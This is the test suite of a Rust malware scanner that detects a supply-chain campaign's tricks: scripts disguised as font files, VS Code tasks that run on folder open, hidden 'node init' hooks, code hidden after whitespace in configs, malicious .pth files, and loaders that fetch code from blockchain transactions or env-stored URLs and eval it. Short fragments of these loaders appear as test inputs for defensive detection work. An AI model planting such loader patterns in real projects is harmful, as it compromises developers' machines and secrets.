    fn base64_blob_is_flagged_only_when_fed_to_eval() {
        let blob = "QUJD".repeat(1000);
        let font =
            format!("var data = base64.toByteArray(\"{blob}\");\nnew Function('x', 'return x');\n");
        assert!(scan_content("node_modules/@vercel/og/index.js", &font).is_empty());
        let evil = format!("eval(require('zlib').inflateSync(\"{blob}\"));\n");
        let found = scan_content("node_modules/x/index.js", &evil);
        assert!(
            rules(&found)
                .iter()
                .any(|t| t.contains("encoded-blob-exec")),
            "{found:?}"
        );
    }

    #[test]
    fn malicious_pth_is_critical_and_editable_install_is_not() {
        let evil = "import os,base64;exec(base64.b64decode('cHJpbnQoMSk='))\n";
        assert!(
            rules(&scan_content("site-packages/x.pth", evil))
                .iter()
                .any(|t| t.contains("pth-startup-exec"))
        );
        let ok = "import __editable___foo_finder; __editable___foo_finder.install()\n";
        assert!(scan_content("site-packages/__editable__.foo.pth", ok).is_empty());
        let coverage = r#"import sys; exec('import os\nif os.getenv("COVERAGE_PROCESS_START"):\n import coverage')"#;
        assert!(scan_content("site-packages/a1_coverage.pth", coverage).is_empty());
    }

    fn polinrider(relative: &str, bytes: &[u8]) -> Vec<String> {
        let p = Path::new(relative);
        let name = p.file_name().unwrap().to_str().unwrap();
        let ext = p.extension().and_then(|e| e.to_str()).unwrap_or("");
        assert!(is_polinrider_file(p, name, ext), "{relative} not routed");
        rules(&scan_polinrider(relative, name, ext, bytes))
    }

    #[test]
    fn polinrider_font_loader_is_flagged_and_real_font_is_not() {
        let js = b"var z = '-5289-1'; require('child_process').exec(x);";
        assert!(
            polinrider("public/fonts/fa-solid-600.ttf", js)[0].contains("font-disguised-script")
        );
        let ttf = [
            0u8, 1, 0, 0, 0, 0x0c, 0, 0x80, 0, 3, 0, 0x40, b'O', b'S', b'/', b'2',
        ];
        assert!(polinrider("public/fonts/inter.ttf", &ttf).is_empty());
    }

    #[test]
    fn polinrider_folder_open_task_running_node_is_critical() {
        let task = br#"{"tasks":[{"command":"node public/fonts/fa-solid-600.ttf","runOptions":{"runOn":"folderOpen"}}]}"#;
        let found = scan_polinrider(".vscode/tasks.json", "tasks.json", "json", task);
        assert_eq!(found[0].severity, Severity::Critical, "{found:?}");
    }

    #[test]
    fn polinrider_node_init_script_is_flagged_and_plain_node_is_not() {
        let evil = br#"{"scripts":{"dev":"node init && next dev"}}"#;
        assert!(polinrider("package.json", evil)[0].contains("node-init-script"));
        let ok =
            br#"{"scripts":{"dev":"node index.js && next dev","init":"node scripts/init.js"}}"#;
        assert!(polinrider("package.json", ok).is_empty());
    }

    #[test]
    fn polinrider_extensionless_js_init_is_flagged_and_shell_init_is_not() {
        let js = b"const h=require('https');h.get('https://api.trongrid.io/v1/x');";
        let found = scan_polinrider("init", "init", "", js);
        assert_eq!(found[0].severity, Severity::Critical, "{found:?}");
        assert!(polinrider("init", b"#!/bin/sh\nrequire() { :; }\n").is_empty());
    }

    #[test]
    fn polinrider_config_bat_and_its_gitignore_line_are_flagged() {
        assert!(
            polinrider("config.bat", b"@echo off\r\nnode init\r\n")[0]
                .contains("config-bat-dropper")
        );
        let gi = polinrider(".gitignore", b"node_modules\n.env*.local\nconfig.bat\n");
        assert!(gi[0].contains("gitignore-config-bat"), "{gi:?}");
        assert!(polinrider(".gitignore", b"node_modules\nconfig.bat.example\n").is_empty());
    }

    #[test]
    fn polinrider_payload_after_spaces_in_config_is_flagged() {
        let src = format!(
            "export default config;{}global['!']='9-5289-1';var _$_1e42=(function(l,e){{}})();\n",
            " ".repeat(200)
        );
        let found = rules(&scan_config("postcss.config.mjs", &src));
        assert!(
            found.iter().any(|t| t.contains("config-space-hidden-code")),
            "{found:?}"
        );
        assert!(scan_campaign_marker("postcss.config.mjs", &src).is_some());
        assert!(scan_campaign_marker("src/a.ts", "const id = 'A-5289-B';").is_none());
    }

    #[test]
    fn polinrider_font_check_skips_lfs_pointer_and_catches_bom_and_unicode() {
        let lfs = b"version https://git-lfs.github.com/spec/v1\noid sha256:ab\nsize 12345\n";
        assert!(polinrider("fonts/inter.woff2", lfs).is_empty());
        assert!(!polinrider("f/a.ttf", b"\xEF\xBB\xBFvar z=require('fs');").is_empty());
        assert!(!polinrider("f/a.ttf", "var \u{3b6}=require('fs');".as_bytes()).is_empty());
        let woff2 = [b'w', b'O', b'F', b'2', 0, 1, 0, 0, 0, 0, 0x5a, 0x1c];
        assert!(polinrider("f/a.woff2", &woff2).is_empty());
    }

    #[test]
    fn polinrider_folder_open_severity_looks_at_the_folder_open_task_only() {
        let watcher = br#"{"tasks":[{"command":"tsc -w","runOptions":{"runOn":"folderOpen"}},{"command":"node scripts/seed.js"}]}"#;
        let found = scan_polinrider(".vscode/tasks.json", "tasks.json", "json", watcher);
        assert_eq!(found[0].severity, Severity::Medium, "{found:?}");
    }

    #[test]
    fn polinrider_node_shebang_init_and_other_node_init_scripts_are_flagged() {
        let found = polinrider(
            "init",
            b"#!/usr/bin/env node\nrequire('child_process').exec(x)\n",
        );
        assert!(found[0].contains("extensionless-js-loader"), "{found:?}");
        for script in ["node init", "node init; next dev", "node init || true"] {
            let pkg = format!(r#"{{"scripts":{{"postinstall":"{script}"}}}}"#);
            assert!(
                !polinrider("package.json", pkg.as_bytes()).is_empty(),
                "{script}"
            );
        }
        assert!(polinrider("package.json", br#"{"scripts":{"a":"node init.js"}}"#).is_empty());
    }

    #[test]
    fn polinrider_gitignore_anchored_entries_and_plain_windows_bat() {
        for entry in ["/config.bat", "**/config.bat"] {
            let gi = format!("node_modules\n{entry}\n");
            assert!(
                !polinrider(".gitignore", gi.as_bytes()).is_empty(),
                "{entry}"
            );
        }
        let plain = scan_polinrider(
            "config.bat",
            "config.bat",
            "bat",
            b"@echo off\r\nset A=1\r\n",
        );
        assert_eq!(plain[0].severity, Severity::Medium);
    }

    #[test]
    fn polinrider_round2_bypasses_are_closed() {
        let nul = b"//\x00\nrequire('child_process').exec(x)";
        assert!(!polinrider("public/fonts/fa-solid-600.ttf", nul).is_empty());
        let eot: Vec<u8> = [vec![0u8; 34], b"LP".to_vec(), vec![0u8; 10]].concat();
        assert!(polinrider("f/a.eot", &eot).is_empty());

        let sev = |src: &[u8]| {
            scan_polinrider(".vscode/tasks.json", "tasks.json", "json", src)[0].severity
        };
        let watcher = b"// See https://go.microsoft.com/fwlink/?LinkId=733558\n{\"tasks\":[{\"command\":\"tsc -w\",\"runOptions\":{\"runOn\":\"folderOpen\"},},]}";
        assert_eq!(sev(watcher), Severity::Medium);
        let evil = b"/* x */{\"tasks\":[{\"command\":\"node public/fonts/x.ttf\",\"runOptions\":{\"runOn\":\"folderOpen\"}},]}";
        assert_eq!(sev(evil), Severity::Critical);
        let indirect = br#"{"tasks":[{"label":"a","dependsOn":["b"],"runOptions":{"runOn":"folderOpen"}},{"label":"b","command":"node public/fonts/fa-solid-600.ttf"}]}"#;
        assert_eq!(sev(indirect), Severity::Critical);

        let sh = b"#!/bin/sh\nrequire('https').get('https://api.trongrid.io/x')\n";
        assert!(!polinrider("init", sh).is_empty());
        let bat = scan_polinrider(
            "config.bat",
            "config.bat",
            "bat",
            b"@echo off\r\nrmdir /s /q node_modules\r\n",
        );
        assert_eq!(bat[0].severity, Severity::Medium);
    }

    #[test]
    fn polinrider_python_chain_loader_and_env_eval_loader_are_critical() {
        let py = "import subprocess as _sp\n_rpc = _load('https://ethereum.publicnode.com', {'method': 'eth_getTransactionByHash'})\n_source = bytes.fromhex(_rpc['result']['input'][2:]).decode()\n_sp.Popen(['node', _tmp.name])\n";
        let found = rules(&scan_content("tests/conftest.py", py));
        assert!(
            found.iter().any(|t| t.contains("chain-c2-loader")),
            "{found:?}"
        );
        let web3 = "const tx = await provider.send('eth_getTransactionByHash', [hash]);\n";
        assert!(scan_content("node_modules/ethers/lib/provider.js", web3).is_empty());

        let js = "const src = atob(process.env.AUTH_API_KEY);\nconst proxy = (await import('node-fetch')).default;\nconst r = await proxy(src);\neval(await r.text());\n";
        let found = rules(&scan_content("scripts/lint_skill_content.ts", js));
        assert!(
            found.iter().any(|t| t.contains("env-remote-eval")),
            "{found:?}"
        );
    }

    #[test]
    fn polinrider_loader_rules_review_cases() {
        let has = |rel: &str, src: &str, rule: &str| {
            rules(&scan_content(rel, src))
                .iter()
                .any(|t| t.contains(rule))
        };
        // Bundle web3 : lookup et Function( très éloignés, pas de décodage d'input.
        let web3 = format!(
            "send('eth_getTransactionByHash',[h]);{}var f=Function('return this')();\n",
            "x".repeat(10_000)
        );
        assert!(!has(
            "node_modules/web3/dist/web3.min.js",
            &web3,
            "chain-c2-loader"
        ));
        // Script CI : clé de service décodée puis passée à gcloud via child_process.
        let ci = "const exec = promisify(require('child_process').exec);\nconst sa = Buffer.from(process.env.GCP_SA_KEY, 'base64').toString('utf8');\nfs.writeFileSync('/tmp/sa.json', sa);\nawait exec('gcloud auth activate-service-account --key-file=/tmp/sa.json');\n";
        assert!(!has("scripts/deploy.js", ci, "env-remote-eval"));
        // Variantes du vrai chargeur.
        let bracket = "const u = Buffer.from(process.env['AUTH_API_KEY'], 'base64').toString();\neval(await (await fetch(u)).text());\n";
        assert!(has("scripts/a.ts", bracket, "env-remote-eval"));
        let destructured = "const { AUTH_API_KEY } = process.env;\neval(await (await fetch(atob(AUTH_API_KEY))).text());\n";
        assert!(has("scripts/b.ts", destructured, "env-remote-eval"));
        let os_system = "import json, os\nr = load('https://ethereum.publicnode.com', 'eth_getTransactionByHash')\nsrc = bytes.fromhex(r['result']['input'][2:]).decode()\nopen('/tmp/x.js','w').write(src)\nos.system('node /tmp/x.js')\n";
        assert!(has("c.py", os_system, "chain-c2-loader"));
        assert!(!polinrider("deploy/prod.env", b"AUTH_API_KEY=\"aHR0cHM6Ly9ldmls\"\n").is_empty());
    }

    #[test]
    fn polinrider_env_file_with_base64_url_is_flagged() {
        let env = b"AUTH_API_KEY=aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2Fk\n";
        assert!(polinrider(".env", env)[0].contains("env-base64-url"));
        assert!(polinrider(".env", b"API_KEY=sk_test_123\nURL=https://example.com\n").is_empty());
    }

    #[test]
    fn ci_aware_detached_stager_is_escalated() {
        let ids: String = (0..40)
            .map(|i| format!("var _0x{:04x}=1;", 0x2b00 + i))
            .collect();
        let src = format!(
            "{ids}\nif(!process.env.CI){{require('child_process').spawn(n,[f],{{detached:true}}).unref();}}\n"
        );
        let found = scan_content("node_modules/x/setup.js", &src);
        assert!(
            found.iter().all(|f| f.severity == Severity::Critical),
            "{found:?}"
        );
    }
}
